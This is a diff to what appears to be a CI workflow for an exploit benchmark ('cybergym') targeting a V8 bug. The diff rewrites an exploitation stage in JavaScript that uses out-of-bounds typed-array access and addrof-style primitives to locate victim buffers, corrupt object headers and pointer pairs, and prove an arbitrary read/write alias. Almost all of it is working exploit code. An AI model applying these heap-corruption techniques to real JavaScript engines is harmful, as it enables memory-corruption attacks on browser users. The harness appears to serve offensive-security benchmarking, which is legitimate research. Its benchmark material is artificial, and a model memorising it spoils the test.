@@ -1,6 +1,6 @@
 # V8-446124892 Official PoC Test — multi-stage exploitation harness
-# Revised: Stage B = d=32 OOB/overlap + Stage B3 abs-R/W alias discovery.
-# ABS_RW_OK only on proven alias; exec/flag not claimed without evidence.
+# Revised: Stage B = d=32 OOB/overlap + Stage B3 OOB header/pointer pivot.
+# ABS_RW_OK only on proven OOB pivot; exec/flag not claimed without evidence.
 # Target: cybergym/v8:human-446124892-nosandbox-buildable
 #
 # Stages
@@ -4033,7 +4033,7 @@ jobs:
 
 
 
-      - name: Test 10 — Stage B d=32 OOB + abs-R/W discovery
+      - name: Test 10 — Stage B d=32 OOB + header pivot discovery
         id: stage_b
         run: |
           set +e
@@ -4041,7 +4041,7 @@ jobs:
           ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
           banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
           log() { echo "[$(ts)] $*"; }
-          banner "TEST 10 / STAGE B — d=32 OOB/overlap + abs-R/W discovery"
+          banner "TEST 10 / STAGE B — d=32 OOB/overlap + OOB header pivot"
           mkdir -p /tmp/out
           docker exec "$CONTAINER" sh -c 'mkdir -p /tmp /workspace' 2>/dev/null || true
           # Ensure container is up
@@ -4102,7 +4102,7 @@ jobs:
           // ABS_RW_OK=1 only if alias or known-constant proof succeeds. No fake exec/flag.
           (function stageB() {
             print("[*] STAGE_B_BEGIN");
-            print("[*] NEXT_STEP=oob_to_abs_rw_discovery");
+            print("[*] NEXT_STEP=oob_header_pointer_pivot");
             if (typeof instance === "undefined" || !instance.exports) {
               print("[-] STAGE_B_NO_INSTANCE");
               print("[*] OOB_OK=0");
@@ -4266,36 +4266,35 @@ jobs:
               print("[*] STAGE_B2_SKIP_OOB reason=no_length_hit");
             }
 
-            // ===== STAGE B3: abs R/W discovery (backing-store / alias) =====
-            // Strategy:
-            //  1) OOB window dump around CAFE markers (headers vs elements)
-            //  2) Cage-dump ArrayBuffer fields for two buffers
-            //  3) Single-field swap/alias attempts (restore always)
-            //  4) ABS_RW_OK only on proven write-through alias
-            print("[*] STAGE_B3_ABS_RW_DISCOVERY");
+            // ===== STAGE B3: OOB header/pointer pivot discovery =====
+            // Prior B3 field-alias (caged_write on addrof(ab)+d) failed.
+            // Next: corrupt OOB indices NEAR victim markers (headers / ptr pairs),
+            // restore always. ABS_RW_OK only on write-through or clear pivot.
+            print("[*] STAGE_B3_OOB_HEADER_PIVOT");
             let STORE_CANDIDATES = 0;
             let ALIAS_ATTEMPTS = 0;
+            let HEADER_HITS = 0;
+            let PIVOT_OK = 0;
 
             if (OOB_OK === 1) {
-              // Fresh OOB buffer + victims with unique markers
               let abO = new ArrayBuffer(0x1000);
               let oob = new Uint32Array(abO);
               let taO = addrof(oob)|0;
               let slotO = (taO + 32)|0;
               let oldO = safe_read(slotO);
               if (oldO !== null) {
-                safe_write(slotO, 0x100);
+                safe_write(slotO, 0x200); // larger window
                 let vics = [];
-                for (let i = 0; i < 24; i++) {
+                for (let i = 0; i < 32; i++) {
                   let a = new ArrayBuffer(0x80);
                   let v = new Uint32Array(a);
                   v[0] = 0xBEEF0000 + i;
                   v[1] = 0xCAFE0000 + i;
+                  v[2] = 0x11110000 + i;
                   vics.push({ab: a, ta: v, aaddr: addrof(a)|0, taddr: addrof(v)|0});
                 }
-                // Find first marker and dump window
                 let hit = -1, hid = -1;
-                let lim = Math.min(oob.length|0, 0x10000);
+                let lim = Math.min(oob.length|0, 0x20000);
                 for (let i = 0; i < lim; i++) {
                   let x = oob[i]|0;
                   if (((x >>> 16) & 0xFFFF) === 0xBEEF) {
@@ -4304,15 +4303,15 @@ jobs:
                     break;
                   }
                 }
-                if (hit >= 0) {
-                  let lo = hit - 32; if (lo < 0) lo = 0;
-                  let hi = hit + 48; if (hi > lim) hi = lim;
+                if (hit < 0) {
+                  print("[-] B3 no BEEF marker");
+                } else {
+                  let lo = hit - 48; if (lo < 0) lo = 0;
+                  let hi = hit + 64; if (hi > lim) hi = lim;
                   let wline = "OOB_WINDOW " + lo + ".." + hi + ":";
-                  for (let i = lo; i < hi; i++) {
-                    wline += " [" + i + "]=" + hex(oob[i]|0);
-                  }
+                  for (let i = lo; i < hi; i++) wline += " [" + i + "]=" + hex(oob[i]|0);
                   print(wline);
-                  // Dump cage fields for that victim AB/TA
+
                   if (hid >= 0 && hid < vics.length) {
                     let V = vics[hid];
                     let abl = "AB_FIELDS @" + hex(V.aaddr) + ":";
@@ -4328,71 +4327,125 @@ jobs:
                     }
                     print(tal);
                   }
-                } else {
-                  print("[-] B3 no BEEF marker in OOB window");
-                }
 
-                // --- Alias attempts: two ABs, swap one candidate field at a time ---
-                // Candidates chosen from prior RE (may fail; only proof sets ABS_RW_OK)
-                let cand = [16, 20, 24, 28, 32, 36, 40, 44];
-                let abA = new ArrayBuffer(0x100);
-                let abB = new ArrayBuffer(0x100);
-                let uA = new Uint32Array(abA);
-                let uB = new Uint32Array(abB);
-                for (let i = 0; i < 16; i++) { uA[i] = 0xA0000000 + i; uB[i] = 0xB0000000 + i; }
-                let aa = addrof(abA)|0, ba = addrof(abB)|0;
-                let taA = addrof(uA)|0, taB = addrof(uB)|0;
-                print("[*] alias bases AB_A=" + hex(aa) + " AB_B=" + hex(ba) + " TA_A=" + hex(taA) + " TA_B=" + hex(taB));
+                  // --- OOB-index probes: relative offsets from marker (header region) ---
+                  // Negative offsets = before elements (likely object metadata)
+                  let rels = [-48, -44, -40, -36, -32, -28, -24, -20, -16, -12, -8, -4, 4, 8];
+                  print("[*] B3_OOB_INDEX_PROBES marker=" + hit);
+                  for (let ri = 0; ri < rels.length; ri++) {
+                    let idx = (hit + rels[ri])|0;
+                    if (idx < 0 || idx >= lim) continue;
+                    STORE_CANDIDATES++;
+                    let oldv = oob[idx]|0;
+                    // Skip pure element markers
+                    if (((oldv >>> 16) & 0xFFFF) === 0xBEEF) continue;
+                    if (((oldv >>> 16) & 0xFFFF) === 0xCAFE) continue;
 
-                function try_alias(obj_off_a, obj_off_b, field_d, label) {
-                  ALIAS_ATTEMPTS++;
-                  let sa = (obj_off_a + field_d)|0;
-                  let sb = (obj_off_b + field_d)|0;
-                  let oa = safe_read(sa);
-                  let ob = safe_read(sb);
-                  if (oa === null || ob === null) return false;
-                  // Point A's field at B's field value (store-like swap)
-                  if (!safe_write(sa, ob)) { safe_write(sa, oa); return false; }
-                  let before = uA[0]|0;
-                  uA[0] = 0x31337377;
-                  let b0 = uB[0]|0;
-                  let a0 = uA[0]|0;
-                  print("[*] alias_try " + label + " d=" + field_d + " A[0]=" + hex(a0) + " B[0]=" + hex(b0) + " beforeA=" + hex(before));
-                  // Success: write through A lands in B (or read of A shows B's prior data pattern)
-                  let ok = false;
-                  if ((b0|0) === (0x31337377|0)) {
-                    ok = true;
-                    print("[+] ALIAS_WRITE_THROUGH " + label + " d=" + field_d);
+                    // Probe 1: mild bump of low 16 bits (length-like)
+                    ALIAS_ATTEMPTS++;
+                    let probe1 = (oldv + 0x10)|0;
+                    oob[idx] = probe1;
+                    let len_chg = "";
+                    let data_chg = "";
+                    if (hid >= 0 && hid < vics.length) {
+                      try {
+                        let L = vics[hid].ta.length|0;
+                        let e0 = vics[hid].ta[0]|0;
+                        let e1 = vics[hid].ta[1]|0;
+                        if (L !== 32) len_chg = " len->" + L;
+                        if ((e0|0) !== ((0xBEEF0000 + hid)|0)) data_chg = " e0->" + hex(e0);
+                        if ((e1|0) !== ((0xCAFE0000 + hid)|0) && data_chg === "") data_chg = " e1->" + hex(e1);
+                      } catch (e) { len_chg = " throw"; }
+                    }
+                    oob[idx] = oldv; // restore
+                    // restore victim elements if needed
+                    if (hid >= 0 && hid < vics.length) {
+                      try {
+                        vics[hid].ta[0] = 0xBEEF0000 + hid;
+                        vics[hid].ta[1] = 0xCAFE0000 + hid;
+                      } catch (e) {}
+                    }
+                    if (len_chg !== "" || data_chg !== "") {
+                      HEADER_HITS++;
+                      print("[+] OOB_HEADER_HIT idx=" + idx + " rel=" + rels[ri] + " old=" + hex(oldv) + len_chg + data_chg);
+                    }
+
+                    // Probe 2: if we have two victims, try copy pointer-like word from later marker region
+                    if (ABS_RW_OK === 0 && hid >= 0 && hid + 1 < vics.length) {
+                      // find second marker
+                      let hit2 = -1;
+                      for (let j = hit + 8; j < lim; j++) {
+                        let x = oob[j]|0;
+                        if (((x >>> 16) & 0xFFFF) === 0xBEEF && ((x & 0xFFFF) === ((hid + 1)|0))) {
+                          hit2 = j; break;
+                        }
+                      }
+                      if (hit2 >= 0) {
+                        let idx2 = (hit2 + rels[ri])|0;
+                        if (idx2 >= 0 && idx2 < lim) {
+                          ALIAS_ATTEMPTS++;
+                          let other = oob[idx2]|0;
+                          oob[idx] = other;
+                          try {
+                            vics[hid].ta[0] = 0x31337377;
+                            let b0 = vics[hid + 1].ta[0]|0;
+                            let a0 = vics[hid].ta[0]|0;
+                            if ((b0|0) === (0x31337377|0)) {
+                              ABS_RW_OK = 1;
+                              PIVOT_OK = 1;
+                              ABS_RW_METHOD = "oob_header_alias_rel" + rels[ri];
+                              print("[+] ALIAS_WRITE_THROUGH OOB idx=" + idx + " rel=" + rels[ri]);
+                              print("[+] ABS_RW_OK method=" + ABS_RW_METHOD);
+                            }
+                            vics[hid].ta[0] = 0xBEEF0000 + hid;
+                            vics[hid + 1].ta[0] = 0xBEEF0000 + hid + 1;
+                          } catch (e) {
+                            print("[!] alias probe throw " + e);
+                          }
+                          oob[idx] = oldv;
+                          if (ABS_RW_OK === 1) break;
+                        }
+                      }
+                    }
                   }
-                  // Restore
-                  safe_write(sa, oa);
-                  uA[0] = before;
-                  uB[0] = 0xB0000000;
-                  return ok;
-                }
 
-                for (let ci = 0; ci < cand.length; ci++) {
-                  let d = cand[ci];
-                  STORE_CANDIDATES++;
-                  if (try_alias(aa, ba, d, "AB")) {
-                    ABS_RW_OK = 1;
-                    ABS_RW_METHOD = "ab_field_alias_d" + d;
-                    print("[+] ABS_RW_OK method=" + ABS_RW_METHOD);
-                    break;
+                  // --- Extra: corrupt 64-bit-looking pairs (lo at idx, hi at idx+1) ---
+                  // Look for hi words like 0x7ffc / 0x6027 near marker and swap lo with peer
+                  if (ABS_RW_OK === 0) {
+                    print("[*] B3_PTR_PAIR_PROBES");
+                    for (let off = -40; off <= -4; off += 4) {
+                      let idx = (hit + off)|0;
+                      if (idx < 0 || idx + 1 >= lim) continue;
+                      let lo = oob[idx]|0;
+                      let hi = oob[idx + 1]|0;
+                      // pointer-ish hi
+                      if (!((hi === 0x7ffc) || (hi === 0x6027) || ((hi & 0xffff) === 0x6027) || (hi > 0x5000 && hi < 0x8000))) {
+                        continue;
+                      }
+                      STORE_CANDIDATES++;
+                      ALIAS_ATTEMPTS++;
+                      print("[*] ptr_pair idx=" + idx + " lo=" + hex(lo) + " hi=" + hex(hi));
+                      // mild: flip low bits of lo only
+                      let old_lo = lo;
+                      oob[idx] = (lo ^ 0x40)|0;
+                      let effected = false;
+                      if (hid >= 0 && hid < vics.length) {
+                        try {
+                          let e0 = vics[hid].ta[0]|0;
+                          if ((e0|0) !== ((0xBEEF0000 + hid)|0)) {
+                            effected = true;
+                            HEADER_HITS++;
+                            print("[+] PTR_PAIR_HIT idx=" + idx + " e0=" + hex(e0));
+                          }
+                        } catch (e) {}
+                      }
+                      oob[idx] = old_lo;
+                      if (hid >= 0 && hid < vics.length) {
+                        try { vics[hid].ta[0] = 0xBEEF0000 + hid; } catch (e) {}
+                      }
+                    }
                   }
-                  if (try_alias(taA, taB, d, "TA")) {
-                    ABS_RW_OK = 1;
-                    ABS_RW_METHOD = "ta_field_alias_d" + d;
-                    print("[+] ABS_RW_OK method=" + ABS_RW_METHOD);
-                    break;
-                  }
                 }
-
-                // Also try setting AB field from TA addrof-derived compressed ptrs (best-effort)
-                if (ABS_RW_OK === 0) {
-                  print("[*] B3 no alias hit on candidate field list");
-                }
-
                 safe_write(slotO, oldO);
               }
             } else {
@@ -4405,12 +4458,14 @@ jobs:
             print("[*] OVERLAP_OK=" + OVERLAP_OK);
             print("[*] STORE_CANDIDATES=" + STORE_CANDIDATES);
             print("[*] ALIAS_ATTEMPTS=" + ALIAS_ATTEMPTS);
+            print("[*] HEADER_HITS=" + HEADER_HITS);
+            print("[*] PIVOT_OK=" + PIVOT_OK);
             print("[*] ABS_RW_OK=" + ABS_RW_OK);
             print("[*] ABS_RW_METHOD=" + ABS_RW_METHOD);
             if (ABS_RW_OK === 1) {
-              print("[*] NOTE=abs_rw_alias_proven");
+              print("[*] NOTE=abs_rw_oob_header_pivot_proven");
             } else {
-              print("[*] NOTE=d32_oob_overlap_ok_abs_rw_pending_re");
+              print("[*] NOTE=oob_header_probe_done_abs_rw_pending");
             }
             print("[*] STAGE_B_END");
           })();
@@ -4487,6 +4542,9 @@ jobs:
           AA=${AA:-0}
           echo "STORE_CANDIDATES=$SC" | tee -a /tmp/out/test10.result
           echo "ALIAS_ATTEMPTS=$AA" | tee -a /tmp/out/test10.result
+          HH=$(grep -oE 'HEADER_HITS=[0-9]+' /tmp/out/test10.combined 2>/dev/null | tail -1 | cut -d= -f2)
+          HH=${HH:-0}
+          echo "HEADER_HITS=$HH" | tee -a /tmp/out/test10.result
           log "Stage B LAYOUT=$LAYOUT ABS_RW=$ABS OOB=$OOB OVERLAP=$OV ALIAS_TRIES=$AA METHOD=$ARWM rc=$RC in=$IN_CT"
 
           # Full dump for offline RE → repo path + artifact
